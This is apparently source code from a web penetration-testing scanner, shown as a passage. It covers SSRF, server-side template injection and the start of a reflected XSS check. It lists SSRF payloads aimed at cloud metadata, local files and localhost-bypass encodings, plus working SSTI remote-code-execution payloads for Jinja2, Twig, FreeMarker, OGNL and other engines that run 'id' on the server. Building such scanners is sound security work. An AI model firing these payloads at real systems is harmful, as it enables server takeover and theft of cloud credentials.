    "ftp://localhost:21/",
    "ldap://localhost:389/",
    # C.3 — extended schemes
    "sftp://localhost:22/etc/passwd",
    "tftp://localhost:69/etc/passwd",
    "netdoc:/127.0.0.1/",
    "jar:http://localhost!/",
    "jar:file:///etc/passwd!/",
    # C.3 — AWS IPv6
    "http://[fd00:ec2::254]/latest/meta-data/",
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
]

_INTERNAL_URLS = [
    "http://localhost/",
    "http://127.0.0.1/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
]

# IP bypass variants for localhost/127.0.0.1
_IP_BYPASSES = [
    "http://127.1/",
    "http://127.0.1/",
    "http://0/",                    # Linux: 0 -> 0.0.0.0
    "http://0177.0.0.1/",           # octal
    "http://0x7f000001/",           # hex
    "http://2130706433/",           # decimal
    "http://[::]/",
    "http://[0:0:0:0:0:0:0:1]/",
    "http://[::ffff:127.0.0.1]/",
    "http://localhost./",           # trailing dot
    "http://LOCALHOST/",
    "http://lOcAlHoSt/",
    "http://127.0.0.1.nip.io/",    # wildcard DNS rebinding
    "http://127-0-0-1.nip.io/",
    "http://spoofed.127.0.0.1.nip.io/",
    # IPv6 extended (C.3)
    "http://[::1]/",
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",
    "http://[::ffff:7f00:1]/",
    "http://[fe80::1]/",
]

# ── Signature patterns ─────────────────────────────────────────────────────────

_SSRF_SIGNATURES: list[tuple[re.Pattern, str]] = [
    # AWS EC2 — specific metadata fields
    (re.compile(r"\bami-id\b"),                               "AWS EC2 ami-id"),
    (re.compile(r"\blocal-ipv4\b"),                           "AWS EC2 local-ipv4"),
    (re.compile(r"iam/security-credentials"),                 "AWS IAM credentials path"),
    (re.compile(r"\bmeta-data/iam\b"),                        "AWS IAM meta-data"),
    (re.compile(r'"accountId"\s*:\s*"\d+'),                   "AWS account metadata JSON"),
    # GCP
    (re.compile(r"\bcomputeMetadata\b"),                      "GCP computeMetadata"),
    (re.compile(r'"serviceAccounts"\s*:'),                    "GCP service accounts"),
    # Azure
    (re.compile(r'"compute"\s*:\s*\{'),                       "Azure IMDS compute"),
    (re.compile(r'"subscriptionId"\s*:\s*"[0-9a-f-]{36}"'),  "Azure subscriptionId"),
    # Kubernetes
    (re.compile(r'"kind"\s*:\s*"ServiceAccount"'),            "Kubernetes ServiceAccount"),
    (re.compile(r'"kind"\s*:\s*"SecretList"'),                "Kubernetes SecretList"),
    # Internal services — strict patterns
    (re.compile(r"\+PONG\b"),                                 "Redis PONG response"),
    (re.compile(r"^STAT pid \d+", re.M),                      "Memcached stats"),
    (re.compile(r'"cluster_name"\s*:'),                       "Elasticsearch cluster"),
    # File read via SSRF — full passwd format (minimum 6 fields separated by :)
    (re.compile(r"root:\w*:\d+:\d+:[^:]*:[^:]+:[^\n]+"),     "file:///etc/passwd via SSRF"),
    # REMOVED: r"127\.0\.0\.1\s+localhost" — too broad,
    # triggers on documentation, help pages, config examples
]

# How many matching signatures are needed for severity=high (otherwise medium)
_HIGH_CONFIDENCE_THRESHOLD = 2

# ── URL keyword hints ──────────────────────────────────────────────────────────

_URL_KEYWORDS  = {"http", "url", "uri", "link", "src", "href", "fetch",
                   "callback", "redirect", "endpoint", "target", "dest", "next",
                   "image", "avatar", "logo", "icon", "resource", "download",
                   "proxy", "forward", "webhook"}
_HOST_KEYWORDS = {"host", "domain", "server", "addr", "ip", "hostname", "site",
                   "origin", "base", "upstream"}

# Parameters with these names are almost never SSRF points —
# skip them to avoid generating thousands of useless requests.
_SKIP_PARAM_NAMES: frozenset[str] = frozenset({
    "page", "p", "per_page", "limit", "offset", "size", "count",
    "sort", "order", "dir", "asc", "desc",
    "id", "user_id", "item_id", "product_id",
    "q", "query", "search", "keyword", "term",
    "format", "type", "mode", "action", "step",
    "lang", "locale", "currency", "timezone",
    "csrf_token", "authenticity_token", "nonce", "_token",
    "utm_source", "utm_medium", "utm_campaign", "ref", "fbclid", "gclid",
    "v", "version", "ts", "timestamp", "t", "_t", "cache",
    "tab", "section", "view", "layout",
})


def _should_test_ssrf(point) -> bool:
    """True if the injection point is worth testing for SSRF."""
    param = (point.name or "").lower().split("[")[0].rstrip("[]")
    return param not in _SKIP_PARAM_NAMES


def _get_payloads_for_point(point) -> list[str]:
    val   = (point.original_value or "").lower()
    param = (point.name or "").lower().split("[")[0]
    combined = val + " " + param

    payloads: list[str] = []

    if any(kw in combined for kw in _URL_KEYWORDS):
        # URL-like parameter — full set including protocol-schemes
        payloads += _CLOUD_METADATA + _INTERNAL_URLS + _PROTOCOL_URLS + _IP_BYPASSES
    elif any(kw in combined for kw in _HOST_KEYWORDS):
        # Host parameter — IP bypasses + cloud metadata, without protocol-schemes
        payloads += _IP_BYPASSES + _INTERNAL_URLS + _CLOUD_METADATA
    else:
        # Unknown parameter — cloud metadata only (most specific)
        # Do NOT include file://, dict://, gopher:// — too many false positives
        payloads += _CLOUD_METADATA

    return payloads


def _check_ssrf(body: str) -> tuple[bool, str, int]:
    """Return (found, desc, confidence_count).

    confidence_count: how many signatures matched (for severity).
    """
    matches = []
    for pattern, desc in _SSRF_SIGNATURES:
        if pattern.search(body):
            matches.append(desc)
    if matches:
        return True, matches[0], len(matches)
    return False, "", 0


class SSRFCheck(BaseCheck):
    name = "ssrf"
    description = "SSRF — Server-Side Request Forgery (cloud metadata, IP bypass, protocol)"
    severity = "high"
    passive = False
    cwe = "CWE-918"
    mitre_attack = "T1090"
    uses_scan_pipeline = True  # scan() has smart per-point payload selection

    def get_payloads(self) -> list[str]:
        payloads = list(_CLOUD_METADATA + _INTERNAL_URLS + _IP_BYPASSES + _PROTOCOL_URLS)
        oob = get_oob_helper()
        if oob and oob.is_configured():
            payloads.insert(0, oob.get_url("ssrf"))
        return payloads + load_payloads("ssrf")

    async def analyze(
        self,
        original_req,
        mutated_req,
        point,
        payload,
        response,
    ) -> "Finding | None":
        body = get_body(response)
        found, desc, confidence = _check_ssrf(body)
        if not found:
            return None
        # Confidence: 2+ signatures -> high, 1 -> medium
        severity = "high" if confidence >= _HIGH_CONFIDENCE_THRESHOLD else "medium"
        from pentool.utils.parser import build_http_request
        return Finding(
            type="ssrf",
            name=f"SSRF ({point.kind.upper()})",
            url=mutated_req.url,
            severity=severity,
            parameter=point.name,
            payload=payload,
            evidence=f"SSRF indicator: {desc} (confidence: {confidence} signature(s))",
            cwe=self.cwe,
            mitre_attack=self.mitre_attack,
            description=f"SSRF in {point.kind} '{point.name}'. Internal resource accessed: {desc}.",
            remediation="Validate URLs against allowlist. Block private IP ranges and metadata endpoints.",
            request_raw=build_http_request(mutated_req),
            response_raw=format_response_raw(response),
        )

    async def scan(self, request, response, http_client, **kwargs):
        if http_client is None:
            return []
        from pentool.modules.scanner.mutator import RequestMutator
        mutator = RequestMutator()
        findings = []
        for point in mutator.extract_points(request):
            # Skip parameters that are never SSRF points
            if not _should_test_ssrf(point):
                continue
            payloads = _get_payloads_for_point(point)
            # OOB first if configured
            oob = get_oob_helper()
            if oob and oob.is_configured():
                payloads = [oob.get_url("ssrf")] + payloads
            # Custom payload files
            payloads += load_payloads("ssrf")
            for payload in payloads:
                mutated = mutator.mutate(request, point, payload)
                try:
                    resp = await http_client.send(mutated)
                    f = await self.analyze(request, mutated, point, payload, resp)
                    if f:
                        findings.append(f)
                        break
                except Exception:
                    pass
        return findings

FILE: modules/scanner/checks/ssti.py

"""SSTI — Server-Side Template Injection (CWE-94).

Detection strategy:
1. Polyglot error probe  → engine fingerprinting via error messages
2. Math probes           → random prime products (statistically unique, no FP on 49)
3. Engine-specific probes → targeted RCE verification after fingerprint
"""
from __future__ import annotations

import random
import re
from typing import TYPE_CHECKING

from pentool.modules.scanner.base import BaseCheck, Finding
from pentool.modules.scanner.checks.helpers import get_body, format_response_raw

if TYPE_CHECKING:
    from pentool.modules.scanner.mutator import InjectionPoint
    from pentool.utils.parser import ParsedRequest, ParsedResponse


# ── Engine fingerprinting via error messages ───────────────────────────────────

_ENGINE_ERRORS: dict[str, list[re.Pattern]] = {
    "jinja2": [
        re.compile(r"jinja2\.exceptions", re.I),
        re.compile(r"TemplateSyntaxError", re.I),
        re.compile(r"UndefinedError", re.I),
        re.compile(r"jinja2\.", re.I),
    ],
    "twig": [
        re.compile(r"Twig\\\\Error", re.I),
        re.compile(r"Twig_Error", re.I),
        re.compile(r"Twig.*syntax error", re.I),
        re.compile(r"TwigException", re.I),
    ],
    "smarty": [
        re.compile(r"Smarty error", re.I),
        re.compile(r"Smarty_Compiler", re.I),
        re.compile(r"smarty_template_class", re.I),
    ],
    "freemarker": [
        re.compile(r"freemarker\.core", re.I),
        re.compile(r"FreeMarker template error", re.I),
        re.compile(r"freemarker\.template", re.I),
    ],
    "velocity": [
        re.compile(r"org\.apache\.velocity", re.I),
        re.compile(r"VelocityException", re.I),
        re.compile(r"velocity\.runtime", re.I),
    ],
    "mako": [
        re.compile(r"mako\.exceptions", re.I),
        re.compile(r"TemplateLookupException", re.I),
        re.compile(r"mako\.template", re.I),
    ],
    "pebble": [
        re.compile(r"com\.mitchellbosecke\.pebble", re.I),
        re.compile(r"PebbleException", re.I),
    ],
    "thymeleaf": [
        re.compile(r"org\.thymeleaf", re.I),
        re.compile(r"TemplateProcessingException", re.I),
        re.compile(r"thymeleaf\.exceptions", re.I),
    ],
    "el": [
        re.compile(r"javax\.el\.", re.I),
        re.compile(r"ELException", re.I),
        re.compile(r"jakarta\.el\.", re.I),
    ],
    "groovy": [
        re.compile(r"groovy\.lang\.GroovyRuntimeException", re.I),
        re.compile(r"groovy\.lang\.", re.I),
    ],
}

# Polyglot that triggers errors in multiple engines simultaneously
_ERROR_PROBE = "{{7/0}}${7/0}#{7/0}<%= 7/0 %>#set($x=7/0)$x"


def _fingerprint_engine(body: str) -> str | None:
    for engine, patterns in _ENGINE_ERRORS.items():
        for pat in patterns:
            if pat.search(body):
                return engine
    return None


# ── Math probe generation ──────────────────────────────────────────────────────

PRIMES = [
    101, 103, 107, 109, 113, 127, 131, 137, 139, 149,
    151, 157, 163, 167, 173, 179, 181, 191, 193, 197,
    199, 211, 223, 227, 229, 233, 239, 241, 251, 257,
]


def _make_ssti_probe() -> tuple[list[tuple[str, str]], list[str]]:
    """Generate unique SSTI probes for one scan session.

    Uses product of two random primes > 100 — result is ~10k-65k,
    statistically impossible to occur naturally in HTML/JSON responses.
    """
    a, b = random.sample(PRIMES, 2)
    result = a * b  # e.g. 101*103=10403

    # For string-repeat probe: small numbers to keep output short
    small_a, small_b = random.sample([7, 8, 9, 11, 12], 2)
    str_repeat = str(small_b) * small_a  # e.g. '8' * 7 = '8888888'

    probe_map = [
        # Jinja2 / Twig / Pebble — numeric multiply
        (f"{{{{{a}*{b}}}}}", str(result)),
        # Jinja2 — string repeat
        (f"{{{{{small_a}*'{small_b}'}}}}", str_repeat),
        # Mako / Genshi / Cheetah
        (f"${{${a}*{b}}}", str(result)),
        # ERB / Spring EL
        (f"#{{{a}*{b}}}", str(result)),
        # Smarty / Blade (PHP)
        (f"{{${a}*{b}}}", str(result)),
        # Velocity
        (f"#set($x={a}*{b})$x", str(result)),
        # FreeMarker
        (f"${{{a}*{b}}}", str(result)),
        # Razor / C#
        (f"@({a}*{b})", str(result)),
        # Golang text/template (needs custom func — probe only)
        (f"{{{{mul {a} {b}}}}}", str(result)),
        # Pug / Handlebars eval
        (f"{{{{= {a} * {b} }}}}", str(result)),
        # Ruby ERB
        (f"<%= {a}*{b} %>", str(result)),
        # Tornado (Python)
        (f"{{% set x={a}*{b} %}}{{{{x}}}}", str(result)),
    ]
    payloads = [p for p, _ in probe_map]
    return probe_map, payloads


# ── Engine-specific RCE confirmation probes ────────────────────────────────────

# These confirm RCE potential after engine is known.
# We look for uid=N(name) in response — OS command execution proof.
_ENGINE_RCE_PROBES: dict[str, list[tuple[str, re.Pattern]]] = {
    "jinja2": [
        (
            "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode()}}",
            re.compile(r"uid=\d+\([\w-]+\)\s+gid=\d+"),
        ),
        # Safer check — just look for 'Popen' class presence
        (
            "{%- for c in ''.__class__.__mro__[1].__subclasses__() -%}"
            "{%- if 'Popen' in c.__name__ -%}SSTI_JINJA2_POPEN{%- endif -%}"
            "{%- endfor -%}",
            re.compile(r"SSTI_JINJA2_POPEN"),
        ),
        (
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            re.compile(r"uid=\d+\([\w-]+\)\s+gid=\d+"),
        ),
        (
            "{{lipsum.__globals__['os'].popen('id').read()}}",
            re.compile(r"uid=\d+\([\w-]+\)\s+gid=\d+"),
        ),
    ],
    "twig": [
        (
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            re.compile(r"uid=\d+\([\w-]+\)\s+gid=\d+"),
        ),
        (
            "{{'id'|filter('system')}}",
            re.compile(r"uid=\d+\([\w-]+\)\s+gid=\d+"),
        ),
    ],
    "smarty": [
        (
            "{php}echo `id`;{/php}",
            re.compile(r"uid=\d+\([\w-]+\)\s+gid=\d+"),
        ),
        (
            "{'id'|shell_exec}",
            re.compile(r"uid=\d+\([\w-]+\)\s+gid=\d+"),
        ),
    ],
    "freemarker": [
        (
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            re.compile(r"uid=\d+\([\w-]+\)\s+gid=\d+"),
        ),
    ],
    "mako": [
        (
            "<%\nimport os\nfoo=os.popen('id').read()\n%>${foo}",
            re.compile(r"uid=\d+\([\w-]+\)\s+gid=\d+"),
        ),
    ],
    "velocity": [
        (
            "#set($rt=$class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))SSTI_VEL",
            re.compile(r"SSTI_VEL|uid=\d+"),
        ),
    ],
    # EL / OGNL (C.5 — Java)
    "el": [
        (
            "${Runtime.getRuntime().exec('id')}",
            re.compile(r"uid=\d+\([\w-]+\)\s+gid=\d+"),
        ),
        (
            "${'id'.execute()}",
            re.compile(r"uid=\d+"),
        ),
    ],
    "ognl": [
        (
            "@java.lang.Runtime@getRuntime().exec('id')",
            re.compile(r"uid=\d+\([\w-]+\)\s+gid=\d+"),
        ),
        (
            "(new java.lang.ProcessBuilder(new java.lang.String[]{'id'})).start()",
            re.compile(r"uid=\d+"),
        ),
    ],
}


# ── Check class ────────────────────────────────────────────────────────────────

class SSTICheck(BaseCheck):
    name = "ssti"
    description = "SSTI — template expression evaluation + engine fingerprint + RCE"
    severity = "critical"
    passive = False
    cwe = "CWE-94"
    mitre_attack = "T1059"
    uses_scan_pipeline = True  # engine calls scan() → probe → analyze()

    def __init__(self) -> None:
        self._probe_map, self._payloads = _make_ssti_probe()

    def get_payloads(self) -> list[str]:
        return list(self._payloads)

    async def analyze(
        self,
        original_req: "ParsedRequest",
        mutated_req: "ParsedRequest",
        point: "InjectionPoint",
        payload: str,
        response: "ParsedResponse",
    ) -> "Finding | None":
        body = get_body(response)

        expected = next((e for p, e in self._probe_map if p == payload), None)
        if not expected:
            return None

        pattern = r'(?<!\d)' + re.escape(expected) + r'(?!\d)'
        if not re.search(pattern, body):
            return None

        m = re.search(pattern, body)
        idx = m.start()
        ctx = body[max(0, idx - 40): min(len(body), idx + len(expected) + 40)]
        snippet = ctx.replace("\n", " ").replace("\r", "")

        from pentool.utils.parser import build_http_request
        return Finding(
            type="ssti",
            name=f"SSTI ({point.kind.upper()})",
            url=mutated_req.url,
            severity=self.severity,
            parameter=point.name,
            payload=payload,
            evidence=f"'{payload}' → evaluated to '{expected}': …{snippet}…",
            cwe=self.cwe,
            mitre_attack=self.mitre_attack,
            description=(
                f"SSTI in {point.kind} '{point.name}'. "
                f"Expression '{payload}' was evaluated server-side to '{expected}'."
            ),
            remediation="Avoid passing user input to template engines. Use sandboxing.",
            request_raw=build_http_request(mutated_req),
            response_raw=format_response_raw(response),
        )

    async def scan(self, request, response, http_client, **kwargs):
        if http_client is None:
            return []
        from pentool.modules.scanner.mutator import RequestMutator
        mutator = RequestMutator()
        findings = []

        for point in mutator.extract_points(request):
            # ── Phase 1: error probe for engine fingerprinting ────────────────
            engine: str | None = None
            try:
                err_mutated = mutator.mutate(request, point, _ERROR_PROBE)
                err_resp = await http_client.send(err_mutated)
                engine = _fingerprint_engine(get_body(err_resp))
            except Exception:
                pass

            # ── Phase 2: math probe sweep ─────────────────────────────────────
            found = False
            for payload in self.get_payloads():
                mutated = mutator.mutate(request, point, payload)
                try:
                    resp = await http_client.send(mutated)
                    f = await self.analyze(request, mutated, point, payload, resp)
                    if f:
                        findings.append(f)
                        found = True
                        break
                except Exception:
                    pass

            # ── Phase 3: engine-specific RCE confirmation ─────────────────────
            if found and engine and engine in _ENGINE_RCE_PROBES:
                for rce_payload, rce_pattern in _ENGINE_RCE_PROBES[engine]:
                    try:
                        rce_mutated = mutator.mutate(request, point, rce_payload)
                        rce_resp = await http_client.send(rce_mutated)
                        rce_body = get_body(rce_resp)
                        if rce_pattern.search(rce_body):
                            from pentool.utils.parser import build_http_request
                            m = rce_pattern.search(rce_body)
                            snippet = rce_body[max(0, m.start()-20):min(len(rce_body), m.end()+20)]
                            findings.append(Finding(
                                type="ssti",
                                name=f"SSTI RCE ({engine.upper()}) ({point.kind.upper()})",
                                url=rce_mutated.url,
                                severity="critical",
                                parameter=point.name,
                                payload=rce_payload,
                                evidence=f"RCE confirmed via {engine}: …{snippet.strip()}…",
                                cwe=self.cwe,
                                mitre_attack=self.mitre_attack,
                                description=(
                                    f"SSTI RCE in {point.kind} '{point.name}' via {engine}. "
                                    "OS command execution confirmed."
                                ),
                                remediation="Never pass user input to template engines. Use sandboxing.",
                                request_raw=build_http_request(rce_mutated),
                                response_raw=format_response_raw(rce_resp),
                            ))
                            break
                    except Exception:
                        pass

        return findings

================================================================================

FILE: modules/scanner/checks/xss.py

"""XSS — Reflected Cross-Site Scripting (CWE-79).

Detection strategy:
1. Probe phase  — send neutral marker to detect injection context
2. Filter probe — detect which chars are filtered/escaped
3. Context-aware payload selection
4. Filter bypass transforms applied if base payload doesn't reflect
"""

from __future__ import annotations

import re
import uuid
from typing import TYPE_CHECKING

from pentool.modules.scanner.base import BaseCheck, Finding
from pentool.modules.scanner.checks.helpers import get_body, get_status, format_response_raw

if TYPE_CHECKING:
    from pentool.modules.scanner.mutator import InjectionPoint
    from pentool.utils.parser import ParsedRequest, ParsedResponse

_MARKER_PREFIX = "xsspwn"


# ── Marker helpers ─────────────────────────────────────────────────────────────

def _make_marker(base_payload: str) -> tuple[str, str]:
    marker = f"{_MARKER_PREFIX}{uuid.uuid4().hex[:8]}"
    tagged = base_payload.replace("alert(1)", f"alert('{marker}')")
    tagged = tagged.replace("alert(document.domain)", f"alert('{marker}')")
    if marker not in tagged:
        tagged = f"{base_payload}<!--{marker}-->"
    return marker, tagged


def _extract_marker(payload: str) -> str | None:
    m = re.search(r"xsspwn[0-9a-f]{8}", payload)
    return m.group(0) if m else None


def _marker_in_body(payload: str, body: str) -> bool:
    marker = _extract_marker(payload)
    if marker:
        return marker in body
    core = payload.split("<!--")[0].strip()
    return len(core) > 8 and core in body


# ── Context detection ──────────────────────────────────────────────────────────

_CTX_PATTERNS = [
    # JS contexts — check before HTML so `var x = "probe"` isn't mistaken for attr
    ("js_template",    re.compile(r'`[^`]*PROBE[^`]*`')),
    ("js_comment",     re.compile(r'/\*[^*]*PROBE[^*]*\*/')),
    ("js_string_single", re.compile(r"'[^']*PROBE[^']*'")),
    ("js_string_double", re.compile(r'"[^"]*PROBE[^"]*"')),
    ("js_unquoted",    re.compile(r'(?:var|let|const|=)\s*PROBE')),
    # HTML attribute contexts
    ("attr_href",      re.compile(r'(?:href|src|action|formaction|data)\s*=\s*["\']?PROBE', re.I)),
    ("attr_double",    re.compile(r'=\s*"[^"]*PROBE[^"]*"')),
    ("attr_single",    re.compile(r"=\s*'[^']*PROBE[^']*'")),
    ("attr_no_quote",  re.compile(r'=PROBE(?:\s|>|/)')),
    # HTML structural
    ("html_comment",   re.compile(r'<!--[^>]*PROBE[^>]*-->')),
    ("html_body",      re.compile(r'>(?:[^<]*)PROBE(?:[^<]*)<')),
]


def _normalize_html_entities(text: str) -> str:
    """Normalize HTML entities before context search.

    Needed so that &apos; -> ' and similar do not break context detection.
    Example: onload='startTimer(&apos;PROBE&apos;)' -> onload='startTimer('PROBE')'
    """
    text = text.replace("&apos;", "'")
    text = text.replace("&#x27;", "'")
    text = text.replace("&#39;", "'")
    text = text.replace("&quot;", '"')
    text = text.replace("&#x22;", '"')
    text = text.replace("&#34;", '"')
    text = text.replace("&lt;", "<")
    text = text.replace("&#x3C;", "<")
    text = text.replace("&#60;", "<")
    text = text.replace("&gt;", ">")
    text = text.replace("&#x3E;", ">")
    text = text.replace("&#62;", ">")
    return text


def _detect_context(probe: str, body: str) -> str:
    """Return injection context string for the reflected probe.

    Before searching, normalize HTML entities — otherwise &apos; in attributes
    breaks js_string_single context detection.
    """
    escaped = re.escape(probe)
    # First search in the original body (for most cases)
    for ctx_name, pattern in _CTX_PATTERNS:
        pat = re.compile(pattern.pattern.replace("PROBE", escaped), pattern.flags)
        if pat.search(body):
            return ctx_name
    # Repeat with normalized body (catches &apos; and similar)
    body_norm = _normalize_html_entities(body)
    if body_norm != body:
        for ctx_name, pattern in _CTX_PATTERNS:
            pat = re.compile(pattern.pattern.replace("PROBE", escaped), pattern.flags)
            if pat.search(body_norm):
                # Return context with _entity suffix so
                # payload-builder adds entity variants
                return ctx_name + "_entity"
    # probe is in body but context unknown
    if probe in body:
        return "html_body"
    return "none"


# ── Filter fingerprinting ──────────────────────────────────────────────────────

_FILTER_PROBE = "<test>\"'`{{7*'7'}}<!--"

def _fingerprint_filters(original_val: str, reflected: str) -> dict[str, bool]:
    """Determine which characters/keywords were filtered in the response."""
    r = reflected.lower()
    return {
        "angle_brackets": "<" not in r,
        "double_quote":   '"' not in r,
        "single_quote":   "'" not in r,
        "backtick":       "`" not in r,
        "template_expr":  "{{" not in r,
        "html_comment":   "<!--" not in r,
        "script_keyword": "script" not in r,
        "on_keyword":     not re.search(r"\bon\w+=", r),
        "alert_keyword":  "alert" not in r,
        "javascript_kw":  "javascript" not in r,
    }


# ── Payload classes per context ────────────────────────────────────────────────
